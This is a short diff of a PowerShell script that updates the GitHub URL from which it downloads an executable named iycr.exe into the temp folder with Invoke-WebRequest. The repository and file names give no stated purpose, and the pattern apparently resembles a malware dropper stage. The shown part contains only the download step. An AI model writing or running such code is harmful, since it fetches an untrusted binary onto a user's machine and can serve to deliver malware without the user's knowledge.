@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/randyman777777777/infarox27/main/iycr.exe"
+$url = "https://github.com/randyman777777777/infarox27/raw/main/iycr.exe"
 $file = "%temp%\iycr.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $file
